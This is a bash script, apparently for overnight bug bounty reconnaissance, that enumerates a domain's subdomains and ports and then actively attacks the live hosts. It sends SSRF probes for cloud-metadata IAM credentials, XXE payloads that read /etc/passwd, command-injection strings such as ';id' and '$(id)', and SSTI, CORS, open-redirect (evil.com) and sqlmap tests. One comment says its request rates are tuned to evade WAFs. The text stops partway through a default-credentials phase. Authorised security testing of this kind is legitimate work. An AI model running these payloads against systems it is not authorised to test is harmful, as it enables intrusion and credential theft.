#!/usr/bin/env bash
# =============================================================================
# recon.sh — Overnight Bug Bounty Recon Script
# Results save to: <script-dir>/<target>/<timestamp>/
# Usage: ./recon.sh <domain> [output-dir]
# Resume: ./recon.sh <domain> --resume <timestamp>
# Scope:  Place out-of-scope domains in scope_exclude.txt next to this script
# =============================================================================

set -euo pipefail

# ─── Colors ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

# ─── Args ────────────────────────────────────────────────────────────────────
TARGET="${1:?Usage: $0 <domain> [output-dir] [--resume <timestamp>]}"
SCRIPT_DIR="$(cd "$(dirname "$(realpath "$0")")" && pwd)"
RESUME_TS=""
CUSTOM_OUT=""

shift
while [[ $# -gt 0 ]]; do
    case "$1" in
        --resume) RESUME_TS="$2"; shift 2 ;;
        *)        CUSTOM_OUT="$1"; shift ;;
    esac
done

BASE_DIR="${CUSTOM_OUT:-$SCRIPT_DIR/$TARGET}"
TIMESTAMP="${RESUME_TS:-$(date +%Y%m%d_%H%M%S)}"
OUT="$BASE_DIR/$TIMESTAMP"

mkdir -p "$OUT"/{subdomains,live,ports,web,vulns,screenshots,js,secrets,logs,scope}
mkdir -p "$OUT/vulns"/{injection,auth,info,smuggling,access,cloud}

LOG="$OUT/logs/recon.log"
CHECKPOINT="$OUT/logs/checkpoint"
SUMMARY="$OUT/SUMMARY.md"
SUMMARY_JSON="$OUT/summary.json"

# ─── Rate limiting ────────────────────────────────────────────────────────────
# Tune these to stay under WAF radar
REQ_DELAY="${REQ_DELAY:-150}"          # ms between requests (dalfox/active tests)
NUCLEI_CONCURRENCY="${NUCLEI_CONCURRENCY:-25}"
HTTPX_THREADS="${HTTPX_THREADS:-40}"
FFUF_THREADS="${FFUF_THREADS:-30}"

# ─── Logging ─────────────────────────────────────────────────────────────────
log()  { echo -e "${CYAN}[*]${RESET} $*" | tee -a "$LOG"; }
ok()   { echo -e "${GREEN}[+]${RESET} $*" | tee -a "$LOG"; }
warn() { echo -e "${YELLOW}[!]${RESET} $*" | tee -a "$LOG"; }
err()  { echo -e "${RED}[-]${RESET} $*" | tee -a "$LOG"; }
step() {
    echo -e "\n${BOLD}${CYAN}══════════════════════════════════════${RESET}" | tee -a "$LOG"
    echo -e "${BOLD}  $*${RESET}" | tee -a "$LOG"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════${RESET}" | tee -a "$LOG"
}

# ─── Resume / Checkpoint ─────────────────────────────────────────────────────
phase_done() {
    local phase="$1"
    grep -qx "$phase" "$CHECKPOINT" 2>/dev/null
}

mark_done() {
    local phase="$1"
    echo "$phase" >> "$CHECKPOINT"
    ok "Phase $phase complete"
}

skip_if_done() {
    local phase="$1"
    if phase_done "$phase"; then
        warn "Phase $phase already complete — skipping (resume mode)"
        return 0
    fi
    return 1
}

# ─── Scope filtering ──────────────────────────────────────────────────────────
SCOPE_EXCLUDE="$SCRIPT_DIR/scope_exclude.txt"
SCOPE_INCLUDE="$SCRIPT_DIR/scope_include.txt"

apply_scope_filter() {
    local input="$1"
    local output="$2"

    cp "$input" "$output.tmp"

    # Remove explicitly excluded domains/patterns
    if [[ -f "$SCOPE_EXCLUDE" ]]; then
        while IFS= read -r pattern; do
            [[ -z "$pattern" || "$pattern" =~ ^# ]] && continue
            grep -viE "$pattern" "$output.tmp" > "$output.tmp2" && mv "$output.tmp2" "$output.tmp" || true
        done < "$SCOPE_EXCLUDE"
        log "Scope exclusions applied from scope_exclude.txt"
    fi

    # If include list exists, only keep those patterns
    if [[ -f "$SCOPE_INCLUDE" ]]; then
        local include_pattern
        include_pattern=$(grep -v '^#' "$SCOPE_INCLUDE" | grep -v '^$' | paste -sd '|')
        if [[ -n "$include_pattern" ]]; then
            grep -iE "$include_pattern" "$output.tmp" > "$output.tmp2" && mv "$output.tmp2" "$output.tmp" || true
            log "Scope inclusions applied from scope_include.txt"
        fi
    fi

    mv "$output.tmp" "$output"
}

# ─── Tool check ───────────────────────────────────────────────────────────────
GOBIN="${GOPATH:-$HOME/go}/bin"
export PATH="$PATH:$GOBIN:/usr/local/go/bin"

check_tool() { command -v "$1" &>/dev/null || [[ -f "$GOBIN/$1" ]]; }

require() {
    local missing=()
    for t in "$@"; do
        check_tool "$t" || missing+=("$t")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        err "Missing tools: ${missing[*]}"
        err "Run ./installer.sh to install them automatically"
        exit 1
    fi
}

require subfinder assetfinder findomain httpx nmap nuclei ffuf \
        gau waybackurls katana dalfox anew gowitness trufflehog sqlmap

# ─── Banner ───────────────────────────────────────────────────────────────────
START_TIME=$(date +%s)
echo -e "${BOLD}${GREEN}"
echo "  ██╗    ██╗██████╗  █████╗ ██╗████████╗██╗  ██╗"
echo "  ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║  ██║"
echo "  ██║ █╗ ██║██████╔╝███████║██║   ██║   ███████║"
echo "  ██║███╗██║██╔══██╗██╔══██║██║   ██║   ██╔══██║"
echo "  ╚███╔███╔╝██║  ██║██║  ██║██║   ██║   ██║  ██║"
echo "   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝"
echo -e "${RESET}"
log "Target    : $TARGET"
log "Output    : $OUT"
log "Started   : $(date)"
[[ -n "$RESUME_TS" ]] && warn "RESUME MODE — skipping completed phases"
log "Req delay : ${REQ_DELAY}ms | Nuclei concurrency: $NUCLEI_CONCURRENCY"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1 — SUBDOMAIN ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 1 — Subdomain Enumeration"

if ! skip_if_done "1"; then
    SUBS_RAW="$OUT/subdomains/raw"
    mkdir -p "$SUBS_RAW"

    log "Running subfinder..."
    subfinder -d "$TARGET" -silent -all -recursive \
        -o "$SUBS_RAW/subfinder.txt" 2>>"$LOG" || warn "subfinder had errors"

    log "Running assetfinder..."
    assetfinder --subs-only "$TARGET" \
        > "$SUBS_RAW/assetfinder.txt" 2>>"$LOG" || warn "assetfinder had errors"

    log "Running findomain..."
    findomain -t "$TARGET" -u "$SUBS_RAW/findomain.txt" 2>>"$LOG" || warn "findomain had errors"

    log "Merging & deduplicating subdomains..."
    cat "$SUBS_RAW"/*.txt 2>/dev/null \
        | grep -iE "\.${TARGET}$|^${TARGET}$" \
        | tr '[:upper:]' '[:lower:]' \
        | sort -u \
        > "$OUT/subdomains/all_subs_raw.txt"

    # Apply scope filter
    cp "$OUT/subdomains/all_subs_raw.txt" "$OUT/subdomains/all_subs.txt"
    apply_scope_filter "$OUT/subdomains/all_subs_raw.txt" "$OUT/subdomains/all_subs.txt"

    TOTAL_SUBS=$(wc -l < "$OUT/subdomains/all_subs.txt")
    ok "Total unique in-scope subdomains: $TOTAL_SUBS"
    mark_done "1"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2 — LIVE HOST DETECTION
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 2 — Live Host Detection (httpx)"

if ! skip_if_done "2"; then
    cat "$OUT/subdomains/all_subs.txt" | httpx \
        -silent \
        -status-code \
        -title \
        -tech-detect \
        -content-length \
        -follow-redirects \
        -threads "$HTTPX_THREADS" \
        -timeout 10 \
        -o "$OUT/live/live_hosts.txt" \
        2>>"$LOG" || warn "httpx exited with errors — continuing with partial results"

    if [[ ! -f "$OUT/live/live_hosts.txt" ]]; then
        warn "httpx produced no output file — creating empty placeholder"
        touch "$OUT/live/live_hosts.txt"
    fi

    awk '{print $1}' "$OUT/live/live_hosts.txt" | sort -u > "$OUT/live/urls.txt"
    LIVE_COUNT=$(wc -l < "$OUT/live/urls.txt")
    ok "Live hosts: $LIVE_COUNT"
    mark_done "2"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3 — PORT SCANNING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 3 — Port Scanning (nmap)"

if ! skip_if_done "3"; then
    if [[ ! -s "$OUT/live/urls.txt" ]]; then
        warn "No live hosts to port scan — skipping nmap"
        mark_done "3"
    else
    while IFS= read -r url; do
        host="${url#http://}"; host="${host#https://}"; host="${host%%/*}"
        dig +short "$host" 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'
    done < "$OUT/live/urls.txt" | sort -u > "$OUT/ports/ips.txt"

    IP_COUNT=$(wc -l < "$OUT/ports/ips.txt")
    log "Scanning $IP_COUNT unique IPs..."

    nmap \
        -iL "$OUT/ports/ips.txt" \
        -sV -sC \
        --open \
        -p 21,22,23,25,53,80,110,143,443,445,465,587,993,995,\
1080,1433,1521,2375,2376,3000,3306,3389,4443,4848,\
5432,5900,6379,7001,8000,8080,8443,8888,9000,9090,9200,27017 \
        --min-rate 2000 \
        -T4 \
        -oN "$OUT/ports/nmap_output.txt" \
        -oX "$OUT/ports/nmap_output.xml" \
        2>>"$LOG" || warn "nmap had errors"

    ok "Port scan complete"
    mark_done "3"
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4 — URL & ENDPOINT COLLECTION
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 4 — URL & Endpoint Collection"

if ! skip_if_done "4"; then
    log "Running gau..."
    cat "$OUT/subdomains/all_subs.txt" \
        | gau --threads 10 --timeout 15 --blacklist png,jpg,gif,css,woff,svg,ico \
        > "$OUT/web/gau_urls.txt" 2>>"$LOG" || warn "gau had errors"

    log "Running waybackurls..."
    cat "$OUT/subdomains/all_subs.txt" \
        | waybackurls \
        >> "$OUT/web/gau_urls.txt" 2>>"$LOG" || warn "waybackurls had errors"

    log "Running katana..."
    katana \
        -list "$OUT/live/urls.txt" \
        -d 3 \
        -jc \
        -silent \
        -ef png,jpg,gif,css,woff,svg,ico,ttf,eot \
        -o "$OUT/web/katana_urls.txt" \
        2>>"$LOG" || warn "katana had errors"

    cat "$OUT/web/gau_urls.txt" "$OUT/web/katana_urls.txt" 2>/dev/null \
        | sort -u > "$OUT/web/all_urls.txt" || touch "$OUT/web/all_urls.txt"

    URL_COUNT=$(wc -l < "$OUT/web/all_urls.txt")
    ok "Total unique URLs: $URL_COUNT"

    # Endpoint filtering
    log "Filtering interesting endpoints..."

    grep -iE "\.(php|asp|aspx|jsp|do|action|cgi|pl|cfm)($|\?)" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_dynamic.txt"

    grep -iE "(=http|=//|url=|redirect=|next=|return=|target=|rurl=|dest=|destination=|redir=|redirect_uri)" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_redirect.txt"

    grep -iE "(api/|/v[0-9]/|/graphql|/rest/|/soap|/rpc|/gql)" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_api.txt"

    grep -iE "(\?|&)(id|uid|user|username|account|order|invoice|ticket|ref|token|key|secret|\
password|pass|hash|debug|test|admin|cmd|exec|query|sql|file|path|dir|url|page|include|\
module|lang|locale|template|view|load|read|fetch|src|href|data|input|out|output|doc|report)=" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_params.txt"

    # Separate param lists for targeted testing
    grep -iE "(\?|&)(file|path|dir|url|src|href|load|fetch|include|read|doc|report|template|view|page|data|out|output|resource|location|open|dest|to|from)=" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_file_params.txt"

    grep -iE "(\?|&)(id|uid|user_id|userid|account|account_id|order|order_id|invoice|ticket|ref|num|number|object|item|record|pid|oid|rid|cid)=" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_id_params.txt"

    grep -iE "(\?|&)(cmd|exec|command|run|shell|ping|query|search|input|process|execute|system)=" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_cmd_params.txt"

    grep -iE "(\?|&)(xml|body|data|soap|payload|content|format|type|input)=" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_xml_params.txt"

    grep -iE "(\?|&)(template|tpl|view|layout|theme|engine|page|render)=" \
        "$OUT/web/all_urls.txt" | sort -u > "$OUT/web/endpoints_template_params.txt"

    grep -iE "\.js($|\?)" "$OUT/web/all_urls.txt" | sort -u > "$OUT/js/js_files.txt"

    ok "Endpoint filtering complete"
    mark_done "4"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5 — DIRECTORY FUZZING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 5 — Directory Fuzzing (ffuf)"

if ! skip_if_done "5"; then
    head -20 "$OUT/live/urls.txt" > "$OUT/web/fuzz_targets.txt"

    WORDLIST=""
    for wl in \
        /usr/share/wordlists/dirb/common.txt \
        /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
        /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; do
        [[ -f "$wl" ]] && { WORDLIST="$wl"; break; }
    done

    if [[ -z "$WORDLIST" ]]; then
        warn "No wordlist found — downloading raft-medium-directories..."
        mkdir -p "$OUT/wordlists"
        WORDLIST="$OUT/wordlists/raft-medium.txt"
        curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt" \
            -o "$WORDLIST" 2>>"$LOG" || warn "Wordlist download failed — skipping ffuf"
    fi

    if [[ -n "$WORDLIST" && -f "$WORDLIST" ]]; then
        mkdir -p "$OUT/web/ffuf"
        while IFS= read -r url; do
            SAFE_NAME=$(echo "$url" | sed 's|https\?://||; s|/|_|g')
            ffuf \
                -u "${url}/FUZZ" \
                -w "$WORDLIST" \
                -mc 200,201,204,301,302,401,403 \
                -t "$FFUF_THREADS" \
                -timeout 10 \
                -p "0.1" \
                -o "$OUT/web/ffuf/${SAFE_NAME}.json" \
                -of json \
                -s \
                2>>"$LOG" || true
        done < "$OUT/web/fuzz_targets.txt"
        ok "Directory fuzzing complete"
    fi
    mark_done "5"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6 — NUCLEI VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 6 — Nuclei Vulnerability Scanning"

if ! skip_if_done "6"; then
    log "Updating nuclei templates..."
    nuclei -update-templates -silent 2>>"$LOG" || warn "Template update failed"

    for SEVERITY in critical high medium; do
        log "Nuclei — severity: $SEVERITY"
        nuclei \
            -l "$OUT/live/urls.txt" \
            -severity "$SEVERITY" \
            -silent \
            -o "$OUT/vulns/nuclei_${SEVERITY}.txt" \
            -c "$NUCLEI_CONCURRENCY" \
            -timeout 15 \
            -rl 50 \
            2>>"$LOG" || warn "nuclei $SEVERITY had errors"
    done

    for TAG in cve misconfig takeover exposure token ssrf xss sqli ssti xxe cors jwt graphql; do
        log "Nuclei — tag: $TAG"
        nuclei \
            -l "$OUT/live/urls.txt" \
            -tags "$TAG" \
            -silent \
            -o "$OUT/vulns/nuclei_${TAG}.txt" \
            -c "$NUCLEI_CONCURRENCY" \
            -rl 50 \
            2>>"$LOG" || warn "nuclei $TAG had errors"
    done

    ok "Nuclei scans complete"
    mark_done "6"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7 — XSS SCANNING (dalfox)
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 7 — XSS Scanning (dalfox)"

if ! skip_if_done "7"; then
    if [[ -s "$OUT/web/endpoints_params.txt" ]]; then
        log "Running dalfox on $(wc -l < "$OUT/web/endpoints_params.txt") parameterized URLs..."
        dalfox pipe \
            --silence \
            --no-color \
            --timeout 10 \
            --delay "$REQ_DELAY" \
            --skip-mining-dom \
            -o "$OUT/vulns/xss_dalfox.txt" \
            < "$OUT/web/endpoints_params.txt" \
            2>>"$LOG" || warn "dalfox had errors"
        ok "XSS scan complete"
    else
        warn "No parameterized URLs — skipping dalfox"
    fi
    mark_done "7"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8 — SQL INJECTION (sqlmap)
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 8 — SQL Injection (sqlmap)"

if ! skip_if_done "8"; then
    if [[ -s "$OUT/web/endpoints_params.txt" ]]; then
        SQL_OUT="$OUT/vulns/injection/sqli"
        mkdir -p "$SQL_OUT"

        log "Running sqlmap (balanced — level 2, risk 1)..."
        # Cap at 50 URLs to keep overnight runtime manageable
        head -50 "$OUT/web/endpoints_params.txt" | while IFS= read -r url; do
            SAFE=$(echo "$url" | md5sum | awk '{print $1}')
            sqlmap \
                -u "$url" \
                --batch \
                --level=2 \
                --risk=1 \
                --threads=3 \
                --timeout=15 \
                --retries=1 \
                --output-dir="$SQL_OUT/$SAFE" \
                --forms \
                --random-agent \
                --delay=1 \
                -q \
                2>>"$LOG" || true
        done

        # Collect confirmed findings
        find "$SQL_OUT" -name "*.csv" 2>/dev/null | xargs cat > "$OUT/vulns/injection/sqli_results.txt" 2>/dev/null || true
        ok "SQLi scan complete"
    else
        warn "No parameterized URLs — skipping sqlmap"
    fi
    mark_done "8"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 9 — SSRF TESTING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 9 — SSRF Testing"

if ! skip_if_done "9"; then
    SSRF_OUT="$OUT/vulns/injection/ssrf.txt"

    # Use a Burp Collaborator or interactsh URL if available, fall back to a canary
    SSRF_PAYLOAD="${SSRF_CALLBACK:-http://169.254.169.254/latest/meta-data/}"
    SSRF_CANARY="http://169.254.169.254"

    # Also check interactsh if available
    INTERACTSH_URL=""
    if check_tool interactsh-client; then
        log "interactsh-client found — using for SSRF OOB detection"
        INTERACTSH_URL=$(interactsh-client -server interactsh.com -n 1 2>/dev/null | head -1 || true)
    fi

    if [[ -s "$OUT/web/endpoints_file_params.txt" ]]; then
        log "Testing $(wc -l < "$OUT/web/endpoints_file_params.txt") file/URL params for SSRF..."

        while IFS= read -r url; do
            for payload in \
                "http://169.254.169.254/latest/meta-data/" \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
                "http://[::1]/" \
                "http://localhost/" \
                "http://0.0.0.0/" \
                "http://2130706433/" \
                "http://metadata.google.internal/computeMetadata/v1/" \
                "http://100.100.100.200/latest/meta-data/"; do

                TEST_URL=$(echo "$url" | sed -E \
                    's/(file=|path=|url=|src=|href=|load=|fetch=|include=|read=|doc=|report=|template=|view=|page=|data=|out=|output=|resource=|location=|open=|dest=|to=|from=)[^&]*/\1'"$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))" 2>/dev/null || echo "$payload")"'/gi')

                RESP=$(curl -sk --max-time 8 \
                    -H "X-Forwarded-For: 127.0.0.1" \
                    -w "\n%{http_code}" \
                    "$TEST_URL" 2>/dev/null || true)
                BODY=$(echo "$RESP" | head -n -1)
                CODE=$(echo "$RESP" | tail -1)

                # Check for AWS metadata indicators
                if echo "$BODY" | grep -qiE "(ami-id|instance-id|security-credentials|iam|computeMetadata|metadata\.google)"; then
                    echo "[SSRF-CONFIRMED] $TEST_URL" | tee -a "$SSRF_OUT"
                    echo "  Response snippet: $(echo "$BODY" | head -3)" >> "$SSRF_OUT"
                fi
            done
            sleep 0.2
        done < "$OUT/web/endpoints_file_params.txt"

        # Also run nuclei SSRF templates
        nuclei \
            -l "$OUT/live/urls.txt" \
            -tags ssrf \
            -silent \
            -o "$OUT/vulns/injection/ssrf_nuclei.txt" \
            -c "$NUCLEI_CONCURRENCY" \
            2>>"$LOG" || true

        ok "SSRF scan complete"
    else
        warn "No file/URL params found — running nuclei SSRF templates only"
        nuclei -l "$OUT/live/urls.txt" -tags ssrf -silent \
            -o "$OUT/vulns/injection/ssrf_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
            2>>"$LOG" || true
    fi
    mark_done "9"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 10 — SSTI TESTING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 10 — Server-Side Template Injection (SSTI)"

if ! skip_if_done "10"; then
    SSTI_OUT="$OUT/vulns/injection/ssti.txt"

    # Polyglot probe — triggers errors in Jinja2, Twig, Freemarker, Pebble, Smarty, Mako
    SSTI_PROBE='{{7*7}}${7*7}<%=7*7%>#{7*7}*{7*7}'
    SSTI_CONFIRM_JINJA='{{7*"7"}}'
    SSTI_CONFIRM_TWIG='{{7*"7"}}{{dump(app)}}'

    if [[ -s "$OUT/web/endpoints_template_params.txt" ]] || [[ -s "$OUT/web/endpoints_params.txt" ]]; then
        local SSTI_TARGET_FILE="$OUT/web/endpoints_template_params.txt"
        [[ ! -s "$SSTI_TARGET_FILE" ]] && SSTI_TARGET_FILE="$OUT/web/endpoints_params.txt"

        log "Testing $(wc -l < "$SSTI_TARGET_FILE") params for SSTI..."

        while IFS= read -r url; do
            # Inject probe into each parameter value
            TEST_URL=$(echo "$url" | sed -E 's/=[^&]*/='"$(python3 -c "import urllib.parse; print(urllib.parse.quote('{{7*7}}', safe=''))" 2>/dev/null || echo '%7B%7B7*7%7D%7D')"'/g')

            RESP=$(curl -sk --max-time 8 "$TEST_URL" 2>/dev/null || true)

            if echo "$RESP" | grep -qE "(49|7777777)"; then
                echo "[SSTI-CANDIDATE] $TEST_URL" | tee -a "$SSTI_OUT"
                echo "  Trigger: 7*7=49 found in response" >> "$SSTI_OUT"
            fi
            sleep 0.15
        done < "$SSTI_TARGET_FILE"

        # Nuclei SSTI templates
        nuclei -l "$OUT/live/urls.txt" -tags ssti -silent \
            -o "$OUT/vulns/injection/ssti_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
            2>>"$LOG" || true

        ok "SSTI scan complete"
    else
        warn "No template params found — running nuclei SSTI only"
        nuclei -l "$OUT/live/urls.txt" -tags ssti -silent \
            -o "$OUT/vulns/injection/ssti_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
            2>>"$LOG" || true
    fi
    mark_done "10"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 11 — XXE TESTING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 11 — XXE Testing"

if ! skip_if_done "11"; then
    XXE_OUT="$OUT/vulns/injection/xxe.txt"
    mkdir -p "$OUT/vulns/injection"

    XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    XXE_OOB='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'

    if [[ -s "$OUT/web/endpoints_xml_params.txt" ]] || [[ -s "$OUT/web/endpoints_api.txt" ]]; then
        log "Testing XML endpoints for XXE..."

        # Test API endpoints that might accept XML
        while IFS= read -r url; do
            for payload in "$XXE_PAYLOAD" "$XXE_OOB"; do
                RESP=$(curl -sk --max-time 10 \
                    -X POST "$url" \
                    -H "Content-Type: application/xml" \
                    -H "Accept: application/xml, text/xml, */*" \
                    -d "$payload" \
                    2>/dev/null || true)

                if echo "$RESP" | grep -qiE "(root:|daemon:|nobody:|passwd|bin:|sys:|sync:|/etc/passwd)"; then
                    echo "[XXE-CONFIRMED] $url" | tee -a "$XXE_OUT"
                    echo "  Payload: $payload" >> "$XXE_OUT"
                fi
            done
            sleep 0.2
        done < <(cat "$OUT/web/endpoints_api.txt" "$OUT/web/endpoints_xml_params.txt" 2>/dev/null | sort -u | head -30)

        # Nuclei XXE templates
        nuclei -l "$OUT/live/urls.txt" -tags xxe -silent \
            -o "$OUT/vulns/injection/xxe_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
            2>>"$LOG" || true

        ok "XXE scan complete"
    else
        warn "No XML endpoints found — running nuclei XXE only"
        nuclei -l "$OUT/live/urls.txt" -tags xxe -silent \
            -o "$OUT/vulns/injection/xxe_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
            2>>"$LOG" || true
    fi
    mark_done "11"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 12 — COMMAND INJECTION
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 12 — Command Injection"

if ! skip_if_done "12"; then
    CMDI_OUT="$OUT/vulns/injection/cmdi.txt"

    CMDI_PAYLOADS=(
        ';id'
        '|id'
        '&&id'
        '$(id)'
        '`id`'
        ';sleep+5'
        '|sleep+5'
        '&&sleep+5'
        ';ping+-c+1+127.0.0.1'
    )

    if [[ -s "$OUT/web/endpoints_cmd_params.txt" ]]; then
        log "Testing $(wc -l < "$OUT/web/endpoints_cmd_params.txt") command params..."

        while IFS= read -r url; do
            for payload in "${CMDI_PAYLOADS[@]}"; do
                ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))" 2>/dev/null || echo "$payload")
                TEST_URL=$(echo "$url" | sed -E 's/=[^&]*/='"$ENCODED"'/g')

                START_T=$(date +%s%N)
                RESP=$(curl -sk --max-time 12 "$TEST_URL" 2>/dev/null || true)
                END_T=$(date +%s%N)
                ELAPSED_MS=$(( (END_T - START_T) / 1000000 ))

                # Check for command output in response
                if echo "$RESP" | grep -qiE "(uid=|gid=|groups=|root|www-data)"; then
                    echo "[CMDI-CONFIRMED] $TEST_URL" | tee -a "$CMDI_OUT"
                    echo "  Payload: $payload" >> "$CMDI_OUT"
                fi

                # Check for time-based (sleep 5 = ~5000ms)
                if [[ "$ELAPSED_MS" -gt 4800 && "$payload" == *"sleep"* ]]; then
                    echo "[CMDI-TIMEBASED] $TEST_URL (${ELAPSED_MS}ms delay)" | tee -a "$CMDI_OUT"
                fi
            done
            sleep 0.2
        done < "$OUT/web/endpoints_cmd_params.txt"

        ok "Command injection scan complete"
    else
        warn "No command params found — skipping active cmdi (nuclei covers passive)"
    fi

    # Nuclei command injection templates regardless
    nuclei -l "$OUT/live/urls.txt" -tags "rce,cmdi" -silent \
        -o "$OUT/vulns/injection/cmdi_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    mark_done "12"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 13 — CORS MISCONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 13 — CORS Misconfiguration"

if ! skip_if_done "13"; then
    CORS_OUT="$OUT/vulns/cors.txt"

    CORS_ORIGINS=(
        "https://evil.com"
        "https://${TARGET}.evil.com"
        "https://evil.${TARGET}"
        "null"
        "https://evil.com%60.${TARGET}"
    )

    log "Testing CORS on $(wc -l < "$OUT/live/urls.txt") live hosts..."
    while IFS= read -r url; do
        for origin in "${CORS_ORIGINS[@]}"; do
            RESP_HEADERS=$(curl -sk --max-time 8 \
                -H "Origin: $origin" \
                -I "$url" 2>/dev/null || true)

            ACAO=$(echo "$RESP_HEADERS" | grep -i "access-control-allow-origin" || true)
            ACAC=$(echo "$RESP_HEADERS" | grep -i "access-control-allow-credentials" || true)

            if echo "$ACAO" | grep -q "$origin"; then
                SEVERITY="LOW"
                echo "$ACAC" | grep -qi "true" && SEVERITY="HIGH"
                echo "[CORS-$SEVERITY] $url | Origin: $origin | $ACAO | $ACAC" | tee -a "$CORS_OUT"
            fi
        done
        sleep 0.15
    done < "$OUT/live/urls.txt"

    # Nuclei CORS templates
    nuclei -l "$OUT/live/urls.txt" -tags cors -silent \
        -o "$OUT/vulns/cors_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    ok "CORS scan complete"
    mark_done "13"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 14 — OPEN REDIRECT
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 14 — Open Redirect Testing"

if ! skip_if_done "14"; then
    REDIRECT_OUT="$OUT/vulns/open_redirects.txt"

    if [[ -s "$OUT/web/endpoints_redirect.txt" ]]; then
        log "Testing $(wc -l < "$OUT/web/endpoints_redirect.txt") redirect endpoints..."
        while IFS= read -r url; do
            TEST_URL=$(echo "$url" | sed -E \
                's/(url=|redirect=|next=|return=|target=|redir=|rurl=|dest=|destination=|redirect_uri=)[^&]*/\1https:\/\/evil.com/gi')
            RESP=$(curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
                --max-time 8 "$TEST_URL" 2>/dev/null || true)
            LOCATION=$(echo "$RESP" | awk '{print $2}')
            if echo "$LOCATION" | grep -q "evil.com"; then
                echo "[REDIRECT] $TEST_URL -> $LOCATION" | tee -a "$REDIRECT_OUT"
            fi
            sleep 0.1
        done < "$OUT/web/endpoints_redirect.txt"
        ok "Open redirect scan complete"
    else
        warn "No redirect params found — skipping"
    fi
    mark_done "14"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 15 — AUTH, JWT & OAUTH TESTING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 15 — Auth / JWT / OAuth Testing"

if ! skip_if_done "15"; then
    AUTH_OUT="$OUT/vulns/auth"
    mkdir -p "$AUTH_OUT"

    # --- Admin panel / login discovery ---
    log "Scanning for exposed admin panels and login pages..."
    ADMIN_WORDLIST=(
        admin login administrator wp-admin wp-login.php phpmyadmin
        dashboard control panel manager console cpanel webmail
        auth signin signup register forgot-password reset-password
        api/auth api/login api/v1/auth api/v1/login oauth/token
        .well-known/oauth-authorization-server
    )

    while IFS= read -r url; do
        for path in "${ADMIN_WORDLIST[@]}"; do
            RESP=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "${url}/${path}" 2>/dev/null || true)
            if [[ "$RESP" =~ ^(200|301|302|401|403)$ ]]; then
                echo "[PANEL] ${url}/${path} [$RESP]" | tee -a "$AUTH_OUT/admin_panels.txt"
            fi
        done
    done < <(head -20 "$OUT/live/urls.txt")

    # --- Default credentials on common panels ---
    log "Testing default credentials on discovered panels..."
